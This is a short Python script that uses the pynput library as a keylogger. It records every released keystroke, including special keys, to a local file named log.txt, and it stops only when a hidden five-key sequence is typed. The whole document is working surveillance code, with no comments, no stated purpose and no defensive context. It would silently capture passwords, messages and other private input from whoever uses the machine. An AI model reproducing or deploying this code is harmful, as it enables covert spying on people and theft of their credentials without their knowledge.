from pynput.keyboard import Listener, Key

from collections import deque

password = ["1", "q", "Key.space", "'", "-"]
keys = deque(maxlen=5)

def log(text):
    with open("log.txt","a") as file_log:
        file_log.write(text)


def monitor(key):
    try:
        log(key.char)
        keys.append(key.char)
    except AttributeError:
        log(" <" + str(key) + "> ")
        keys.append(str(key))
    if "".join(password) == "".join(keys):
        return False


with Listener(on_release=monitor) as listener:
    listener.join()
